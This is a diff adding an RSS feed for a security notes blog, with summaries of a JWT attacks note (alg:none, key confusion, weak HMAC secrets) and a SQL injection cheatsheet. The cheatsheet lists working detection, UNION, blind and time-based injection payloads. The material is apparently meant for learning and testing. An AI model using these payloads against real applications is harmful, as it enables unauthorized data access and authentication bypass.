@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Web on 0xdad0</title>
+    <link>/notes/web/</link>
+    <description>Recent content in Web on 0xdad0</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Thu, 03 Sep 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="/notes/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>JWT Attacks</title>
+      <link>/notes/web/jwt-attacks/</link>
+      <pubDate>Thu, 03 Sep 2026 00:00:00 +0000</pubDate>
+      <guid>/notes/web/jwt-attacks/</guid>
+      <description>&lt;p&gt;A JWT is &lt;code&gt;base64url(header).base64url(payload).signature&lt;/code&gt;. Most attacks target the signature verification step.&lt;/p&gt;&#xA;&lt;h2 id=&#34;alg-none&#34;&gt;alg: none&lt;/h2&gt;&#xA;&lt;p&gt;Strip the signature and change the header algorithm:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;alg&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;typ&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JWT&amp;#34;&lt;/span&gt; }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Some libraries accept a token with an empty signature section.&lt;/p&gt;&#xA;&lt;h2 id=&#34;key-confusion&#34;&gt;Key confusion&lt;/h2&gt;&#xA;&lt;p&gt;If the server verifies with an RSA &lt;strong&gt;public&lt;/strong&gt; key but the library accepts HS256, sign the token with the public key as an HMAC secret.&lt;/p&gt;&#xA;&lt;h2 id=&#34;weak-hmac-secret&#34;&gt;Weak HMAC secret&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;alg: HS256&lt;/code&gt; with a short or common secret is crackable:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>SQL Injection Cheatsheet</title>
+      <link>/notes/web/sql-injection/</link>
+      <pubDate>Thu, 03 Sep 2026 00:00:00 +0000</pubDate>
+      <guid>/notes/web/sql-injection/</guid>
+      <description>&lt;h2 id=&#34;detection&#34;&gt;Detection&lt;/h2&gt;&#xA;&lt;p&gt;Classic probes to reveal injectable parameters:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39; or 1=1-- -&#xA;&amp;#34; or &amp;#34;&amp;#34;=&amp;#34;&#xA;1&amp;#39; order by 10-- -&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Watch for error messages, changed row counts or blank pages.&lt;/p&gt;&#xA;&lt;h2 id=&#34;union-based&#34;&gt;UNION-based&lt;/h2&gt;&#xA;&lt;p&gt;First find the number of columns with &lt;code&gt;order by&lt;/code&gt;, then union the payload:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select null,null-- -&#xA;1&amp;#39; union select &amp;#39;a&amp;#39;,version()-- -&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;blind&#34;&gt;Blind&lt;/h2&gt;&#xA;&lt;p&gt;Conditional errors on MySQL:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and (select 1 from (select if(ascii(substr(user,1,1))=114,1,(select 1 union select 2)))x)-- -&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Time-based:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; and sleep(5)-- -&#xA;1&amp;#39; and pg_sleep(5)-- -&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;out-of-band&#34;&gt;Out of band&lt;/h2&gt;&#xA;&lt;p&gt;On SQL Server with &lt;code&gt;xp_dirtree&lt;/code&gt;:&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
